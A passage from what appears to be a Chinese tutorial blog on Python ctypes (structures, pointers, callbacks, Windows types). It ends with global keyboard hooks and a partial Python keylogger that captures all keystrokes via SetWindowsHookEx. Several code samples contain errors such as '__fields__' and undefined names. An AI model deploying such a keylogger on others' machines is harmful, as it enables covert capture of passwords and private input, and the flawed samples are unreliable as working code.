id="3-函数参数和返回值"><a href="#3-函数参数和返回值" class="headerlink" title="3.函数参数和返回值"></a>3.函数参数和返回值</h3><ul><li>设置函数的参数类型使用函数的argtypes属性，直接赋值为一个ctypes类型的列表或元组</li><li>设置函数的返回值类型使用函数的restype属性</li></ul><pre class=" language-python"><code class="language-python">func<span class="token punctuation">.</span>argtypes<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_void_p<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#设置函数参数类型为int,int,int,void*</span>func<span class="token punctuation">.</span>restype<span class="token operator">=</span>c_float    <span class="token comment" spellcheck="true">#设置返回值类型为float</span></code></pre><ul><li>python中，默认函数返回值为c_int型，可以不用显式设置函数的restype属性，若参数类型不是c_int型则需要设置</li><li>除了整数、字节串和字符串以外Python类型的参数传递，必须使用ctypes类型做包装</li></ul><h3 id="4-结构体"><a href="#4-结构体" class="headerlink" title="4.结构体"></a>4.结构体</h3><ul><li>自定义的结构体和联合体必须继承自ctypes的Structure和Union这两个类</li><li>每一个子类必须定义_fields_属性，是一个二维的tuples列表，描述类的一个数据成员的字段名和类型</li><li>字段类型必须是一个ctypes类型，如c_int，或者任何其他的继承ctypes的类型，如Structure，Union，Array，指针等</li><li>例如一个简单结构，包含两个整型x和y</li><li>也可创建复杂结构体 </li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> types<span class="token keyword">class</span> <span class="token class-name">Point</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">'y'</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>p1<span class="token operator">=</span>Point<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>point<span class="token punctuation">.</span>x<span class="token punctuation">,</span>point<span class="token punctuation">.</span>y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2</span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">RECT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"upperleft"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"lowerright"</span><span class="token punctuation">,</span>POINT<span class="token punctuation">)</span><span class="token punctuation">]</span>rc<span class="token operator">=</span>RECT<span class="token punctuation">(</span>POINT<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINT<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>upperleft<span class="token punctuation">.</span>y<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>x<span class="token punctuation">,</span>rc<span class="token punctuation">.</span>lowerright<span class="token punctuation">.</span>y<span class="token punctuation">)</span></code></pre><h3 id="5-数组"><a href="#5-数组" class="headerlink" title="5.数组"></a>5.数组</h3><ul><li>数组就是序列，包含固定数量的相同类型的实例。推荐的创建数组类型的方式是使用*和整数应用到类型</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">POINT</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"y"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">]</span>TenPointsArrayType<span class="token operator">=</span>Point<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#创建一个数组类型，由10个Point组成的数组</span>arr<span class="token operator">=</span>TenPointsArrayType<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个数组类的对象</span>type_int_array_10<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#先定义一个数组类型</span>type_int_array_10_10<span class="token operator">=</span>type_int_array_10<span class="token operator">*</span><span class="token number">10</span>    <span class="token comment" spellcheck="true">#定义二维数组</span>my_array<span class="token operator">=</span>type_int_array_10_10<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建二维数组对象</span>my_array<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span>    <span class="token comment" spellcheck="true">#使用二维数组</span></code></pre><h3 id="6-指针和引用"><a href="#6-指针和引用" class="headerlink" title="6.指针和引用"></a>6.指针和引用</h3><ul><li>ctypes中用POINTER和pointer表示指针，使用POINTER时需要设置指向的数据类型，而pointer则直接从变量中得到一个特定类型的指针</li><li>ctypes还可以用byref()函数直接从变量得到指针指向的数据类型，用于传递参数引用。通常使用byref()的地方同样也可用指针函数pointer()，但pointer()通常会额外创建一个指针对象，使用byref()会更快</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>type_p_int<span class="token operator">=</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建指向整数的指针类型</span>v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>p_int<span class="token operator">=</span>type_p_int<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#给指针变量(p_int)赋值（为变量v的地址）</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针引用值使用[0]</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#指针实例的contents属性，返回指针所指向的对象，输出c_long(4)</span>v<span class="token operator">=</span>c_int<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义一个整数，值为4</span>p_int<span class="token operator">=</span>pointer<span class="token punctuation">(</span>v<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#直接得到v的指针，不需创建指针类型（省去类型声明）</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出4</span><span class="token keyword">print</span><span class="token punctuation">(</span>p_int<span class="token punctuation">.</span>contents<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出c_long(4)</span></code></pre><ul><li>对指针类型c_char_p，c_wchar_p，c_void_p的赋值将会改变其指向的内存区域地址，而不是改变内存块的值（因为Python字符串是只读的）</li><li>如果需要一个可写的内存块，使用函数create_string_buffer()创建</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建3字节长的buf，且初始化为0</span><span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出3'\x00\x00\x00'</span>p<span class="token operator">=</span>create_string_buffer<span class="token punctuation">(</span><span class="token string">"Hello"</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hello\x00\x00\x00\x00\x00'</span>p<span class="token punctuation">.</span>value<span class="token operator">=</span><span class="token string">"Hi"</span>    <span class="token comment" spellcheck="true">#修改buf内容（这是可写的buf）</span><span class="token keyword">print</span><span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">,</span>repr<span class="token punctuation">(</span>p<span class="token punctuation">.</span>raw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出10'Hi\x00lo\x00\x00\x00\x00\x00'</span>pw<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#创建一个unicode的buf，初始化为0</span>printf<span class="token punctuation">(</span>sizeof<span class="token punctuation">(</span>pw<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出6</span></code></pre><h3 id="7-类型转换"><a href="#7-类型转换" class="headerlink" title="7.类型转换"></a>7.类型转换</h3><ul><li>ctypes会做严格的类型检查</li><li>但也可以传递兼容类型，如数组类型代替指针类型</li><li>如果函数参数声明为某种指针类型（例如POINT(c_int)类型），则传递该指针指向的对象类型也是可以的（例如这里可以传递c_int），ctypes会自动加上byref()函数进行类型转换</li><li>ctypes也提供了一个转换函数cast()，可以使用类似于C语言强制类型转换的方式进行类型转换</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">class</span> <span class="token class-name">BX</span><span class="token punctuation">(</span>Structure<span class="token punctuation">)</span><span class="token punctuation">:</span>    __fields__<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token string">"count"</span><span class="token punctuation">,</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"value"</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>b<span class="token operator">=</span>BX<span class="token punctuation">(</span><span class="token punctuation">)</span>b<span class="token punctuation">.</span>count<span class="token operator">=</span><span class="token number">3</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_int<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#数组和指针的转化</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>b<span class="token punctuation">.</span>count<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">.</span>values<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出1 2 3</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#设置指针为NULL</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#报错，类型不对。需要int*或int数组。这里是byte数组</span>b<span class="token punctuation">.</span>values<span class="token operator">=</span>cast<span class="token punctuation">(</span><span class="token punctuation">(</span>c_byte<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#正确，强制把byte数组转化为int</span></code></pre><h3 id="8-回调函数"><a href="#8-回调函数" class="headerlink" title="8.回调函数"></a>8.回调函数</h3><ul><li>ctypes允许在python中创建C回调函数指针，称为回调函数</li><li>需要为回调函数创建一个类，该类知道调用协议，函数返回值类型，函数接受的参数个数及类型。ctypes通过工厂函数CFUNCTYPE()支持回调函数</li><li>CFUNCTYPE函数使用普通cdecl调用约定来为回调函数创建类型。在Windows平台，WINFUNCTYPE函数使用stdcall调用约定来为回调函数创建类型</li><li>调用这两个函数时，第一个参数为回调函数的返回值，剩下的参数为回调函数的参数<br>例：C标准库中的快排qsort()是一个借助回调函数进行排序的函数，C原型及其正常调用形式：</li></ul><pre class=" language-C++"><code class="language-C++">void qsort( void *base,    //数组的起始地址            size_t nmemb,    //数组的元素个数            size_t size,    //每个元素的大小（字节数）            int (*compar)(const void *,const void *)    //比较函数的函数指针);    //qsort函数原型int compare(const void *a, const void *){    return (*(int*)a-*(int*)b);}int values[]={40,10,100,90,20,25};qsort(values,6,sizeof(int),compare);    //C中正常调用</code></pre><p>Python借助ctypes回调函数进行qsort排序</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>libc<span class="token operator">=</span>cldd<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'msvcrt.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#(Microsoft Visual C Runtime Library)</span>CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span> POINTER<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span><span class="token keyword">def</span> <span class="token function">py_cmp_func</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能，python代码实现</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"py_cmp_func"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>b<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>cmp_func<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>py_cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#回调函数对象</span>IntArray5<span class="token operator">=</span>c_int<span class="token operator">*</span><span class="token number">5</span>ia<span class="token operator">=</span>IntArray5<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">99</span><span class="token punctuation">)</span>qsort<span class="token operator">=</span>libc<span class="token punctuation">.</span>qsort    <span class="token comment" spellcheck="true">#排序函数地址</span>qsort<span class="token punctuation">.</span>restype<span class="token operator">=</span>None    <span class="token comment" spellcheck="true">#排序函数返回值</span>qsort<span class="token punctuation">(</span>ia<span class="token punctuation">,</span>len<span class="token punctuation">(</span>ia<span class="token punctuation">)</span><span class="token punctuation">,</span>sizeof<span class="token punctuation">(</span>c_int<span class="token punctuation">)</span><span class="token punctuation">,</span>cmp_func<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#调用排序函数，传入一个回调函数对象</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ia<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">" "</span><span class="token punctuation">)</span></code></pre><h3 id="9-windows类型"><a href="#9-windows类型" class="headerlink" title="9.windows类型"></a>9.windows类型</h3><ul><li>Windows API函数不使用标准C的调用约定<ul><li>LoadLibrary时不能够使用cdll.LoadLibrary而使用windll.LoadLibrary</li><li>在声明回调函数指针类型的时候，不能用CFUNCTYPE而是用WINFUNCTYPE</li></ul></li><li>Windows API有很多内建类型，ctypes内部都已经定义好了，导入子模块wintypes后，可以直接使用</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> wintypes    <span class="token comment" spellcheck="true">#HWND等类型已定义好了，可直接使用</span>WNDENUMPROC<span class="token operator">=</span>WINFUNCTYPE<span class="token punctuation">(</span>wintypes<span class="token punctuation">.</span>BOOL<span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#定义回调函数类型</span>                        wintypes<span class="token punctuation">.</span>HWND<span class="token punctuation">,</span>                        wintypes<span class="token punctuation">.</span>LPARAM<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">EnumWindowsProc</span><span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#实现回调函数功能</span>    length<span class="token operator">=</span>user32<span class="token punctuation">.</span>GetWindowTextLengthW<span class="token punctuation">(</span>hwnd<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>    buffer<span class="token operator">=</span>create_unicode_buffer<span class="token punctuation">(</span>length<span class="token punctuation">)</span>    user32<span class="token punctuation">.</span>GetWindowTextW<span class="token punctuation">(</span>hwnd<span class="token punctuation">,</span>buffer<span class="token punctuation">,</span>length<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#将指定窗口的标题条文本拷贝到一个缓冲区</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>buffer<span class="token punctuation">.</span>value<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token boolean">True</span>user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>LoadLibrary<span class="token punctuation">(</span><span class="token string">'user32.dll'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#加载dll</span>user32<span class="token punctuation">.</span>EnumWindows<span class="token punctuation">(</span>WNDENUMPROC<span class="token punctuation">(</span>EnumWindowsProc<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#枚举所有屏幕上的顶层窗口，将窗口句柄传送给应用程序定义的回调函数</span></code></pre><h2 id="五、键盘钩子"><a href="#五、键盘钩子" class="headerlink" title="五、键盘钩子"></a>五、键盘钩子</h2><ul><li>使用user32.dll提供的SetWindowsHookEx()函数，可以设置钩子。有消息到来或发生鼠标点击、键盘输入事件时，操作系统提供了中间拦截机制，这称为“钩子”。从功能上实现这种机制的函数称为钩子过程（回调函数）</li><li>操作系统支持为一个钩子类型（鼠标点击、键盘输入等）设置多个钩子过程，并通过钩链管理链表</li><li>每一个Hook都有一个与之相关联的指针列表，称之为钩子链表，由系统来维护。这个列表的指针指向指定的，应用程序定义的，被Hook子程调用的回调函数，也就是该钩子的各个处理子程</li><li>最后安装的钩子放在链的开始，而最早安装的钩子放在最后，也就是后加入的先获得控制权</li><li>钩子分为本地钩子（LocalHook）与全局钩子（GlobalHook）两种。本地钩子 是针对特定线程设置的，全局钩子针对操作系统中运行的所有线程设置<ul><li>钩子类型为键盘输入时，通过为键盘输入设置全局钩子可以对用户的所有键盘输入进行监视。若设置的是本地钩子，则只有相应线程管理的窗口激活后，键盘输入才会触发对钩子过程的调用</li></ul></li></ul><h3 id="1-键盘钩子机制"><a href="#1-键盘钩子机制" class="headerlink" title="1.键盘钩子机制"></a>1.键盘钩子机制</h3><ul><li>1.设置钩子：通过user32.dll的SetWindowsHookEx()函数可以设置钩子，注册用于处理消息的钩子过程（回调函数）</li><li>2.注册钩链：注册后的钩子过程由钩链管理，钩链的最前面注册有钩子过程的指针。接下来，等待键盘输入类型的消息进入相关线程对队列</li><li>3.键盘输入：用户使用键盘向计算机输入想要的消息。键盘控制器将用户输入转换为计算机可识别的信号，并传递给键盘驱动程序</li><li>4.系统队列：来自键盘的消息进入操作系统管理的系统队列，等待进入负责处理消息的线程队列</li><li>5.线程队列：消息进入处理线程的队列后，不会被发送到相应窗口，而是发送给钩链中第一个指针所指的钩子过程</li><li>6.消息钩取：来自线程队列的消息被传递给钩链中第一个指针（实际是指针所指的钩子过程）</li><li>7.钩子过程：钩子过程接收消息，执行程序员指定的动作。大部分黑客攻击代码都位于钩子过程。处理结束后，将消息传递给钩链的下一个指针，也称为回调函数</li><li>8.钩链指针：消息被依次传递给钩链中指针所指的钩子过程。最后一个钩子过程处理完消息后，将消息传递给原先指定的窗口</li><li>设置好钩子后，即可对队列持续进行监视，这会加重系统负担。完成指定任务后，一定要拆除钩子，尽量减少对系统性能的影响<br><img src="https://www.hualigs.cn/image/60534b2953b5e.jpg" alt=""></li></ul><h3 id="2-SetWindowsHookEx函数"><a href="#2-SetWindowsHookEx函数" class="headerlink" title="2.SetWindowsHookEx函数"></a>2.SetWindowsHookEx函数</h3><pre class=" language-C++"><code class="language-C++">HHOOK WINAPI SetWindowsHookEx(    __in int idHook,    //钩子类型，选择对何种类型的消息进行钩取    __in HOOKPROC lpfn,    //回调函数地址    __in HINSTANCE hMod,    //应用程序实例的句柄    __in DWORD dwThreadId    //线程ID，若为0，钩子与所有线程关联，即为全局钩子);    //函数执行成功，则返回值就是该钩子过程的句柄；若此函数执行失败，则返回值为NULL(0)//例：SetWindowsHookEx(WH_KEYBOARD,KeyBoardProc,HInstance,0);</code></pre><h3 id="3-利用ctypes的调用结构"><a href="#3-利用ctypes的调用结构" class="headerlink" title="3.利用ctypes的调用结构"></a>3.利用ctypes的调用结构</h3><pre class=" language-python"><code class="language-python">CMPFUNC<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>pointer<span class="token operator">=</span>CMPFUNC<span class="token punctuation">(</span>hook_Procedure<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#hook_Procedure由用户定义</span>windll<span class="token punctuation">.</span>user32<span class="token punctuation">.</span>SetWindowsHookEx<span class="token punctuation">(</span>    <span class="token number">13</span><span class="token punctuation">,</span>    <span class="token comment" spellcheck="true">#WH_KEYBOARD_LL</span>    pointer<span class="token punctuation">,</span>    windll<span class="token punctuation">.</span>kernel32<span class="token punctuation">.</span>GetModuleHandle<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token number">0</span><span class="token punctuation">)</span></code></pre><h3 id="4-钩子子程"><a href="#4-钩子子程" class="headerlink" title="4.钩子子程"></a>4.钩子子程</h3><ul><li>应用程序定义的回调函数（CALLBACK Function），定义为普通的C函数。用以监视系统或某一特定类型的事件</li></ul><pre class=" language-C++"><code class="language-C++">LRESULT CALLBACK HookProc(    int nCode,    //Hook代码    WPARAM wParam,    //消息参数    LPARAM lParam);</code></pre><ul><li>使用API函数SetWindowsHookEx()把一个应用程序定义的钩子子程安装到钩子链表中</li><li>处理完消息后，调用API函数CallNextHookEx来继续传递该消息</li><li>钩子在使用完之后需要用UnhookWindowsHookEx()卸载</li></ul><p>例：设置全局钩子，将用户的所有键盘输入显示到控制台。若计算机中没有安装键盘安全程序，则会看到键盘输入的所有内容都在控制台中显示</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> MSG<span class="token keyword">from</span> ctypes<span class="token punctuation">.</span>wintypes <span class="token keyword">import</span> DWORD<span class="token triple-quoted-string string">'''使用windll：声明user32与kernel32类型的变量。使用相应DLL提供的函数时，格式为unicode'''</span>user32<span class="token operator">=</span>windll<span class="token punctuation">.</span>user32kernel32<span class="token operator">=</span>windll<span class="token punctuation">.</span>kernel32WH_KEYBOARD_LL<span class="token operator">=</span><span class="token number">13</span>    <span class="token comment" spellcheck="true">#变量声明：在Win32 API内部定义并使用的变量值</span>WH_KEYDOWN<span class="token operator">=</span><span class="token number">0x0100</span>CTRL_CODE<span class="token operator">=</span><span class="token number">162</span><span class="token keyword">class</span> <span class="token class-name">KeyLogger</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#定义类：定义拥有挂钩与拆钩功能的类</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>lUser32<span class="token operator">=</span>user32        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None    <span class="token triple-quoted-string string">'''    定义挂钩函数：使用user32.DLL的SetWindowsHookExA()函数设置钩子,要监视的事件为WH_KEYBOARD_LL，范围设置为操作系统中运    '''</span>    <span class="token keyword">def</span> <span class="token function">installHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>pointer<span class="token punctuation">)</span><span class="token punctuation">:</span>    self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>SetWindowsHookExA<span class="token punctuation">(</span>WH_KEYBOARD_LL<span class="token punctuation">,</span>pointer<span class="token punctuation">,</span>kernel32<span class="token punctuation">.</span>GetModuleHandleW<span class="token punctuation">(</span>None<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token operator">not</span> self<span class="token punctuation">.</span>hooked<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token triple-quoted-string string">'''    定义拆钩函数：调用user32.DLL中的UnhookwindowsHookEx()函数，拆除之前设置的钩子    '''</span>    <span class="token keyword">def</span> <span class="token function">unInstallHookProc</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> self<span class="token punctuation">.</span>hooked <span class="token keyword">is</span> None<span class="token punctuation">:</span>            <span class="token keyword">return</span>        self<span class="token punctuation">.</span>lUser32<span class="token punctuation">.</span>UnhookwindowsHookEx<span class="token punctuation">(</span>self<span class="token punctuation">.</span>hooked<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>hooked<span class="token operator">=</span>None<span class="token triple-quoted-string string">'''获取函数指针：若想注册钩子过程（回调函数），必须穿入函数指针'''</span><span class="token keyword">def</span> <span class="token function">getFPTR</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">:</span>    CMPFUN<span class="token operator">=</span>CFUNCTYPE<span class="token punctuation">(</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>c_int<span class="token punctuation">,</span>POINTER<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> CMPFUNC<span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''定义钩子过程'''</span><span class="token keyword">def</span> <span class="token function">hookProc</span><span class="token punctuation">(</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> wParam <span class="token keyword">is</span> <span class="token operator">not</span> WM_KEYDOWN<span class="token punctuation">:</span>        <span class="token keyword">return</span> user32<span class="token punctuation">.</span>CallNextHookEx<span class="token punctuation">(</span>keylogger<span class="token punctuation">.</span>hooked<span class="token punctuation">,</span>nCode<span class="token punctuation">,</span>wParam<span class="token punctuation">,</span>lParam<span class="token punctuation">)</span>    hookedkey<span class="token operator">=</span>chr<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>hookedkey<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>CTRL_CODE<span class="token operator">==</span>int<span class="token punctuation">(</span>lParam<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Crl pressed, call unistallHook()"</span><span class="token punctuation">)</span>        KeyLogger<span class="token punctuation">.</span>unistallHookProc<span class="token punctuation">(</span><span class="token punctuation">)</span>        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span 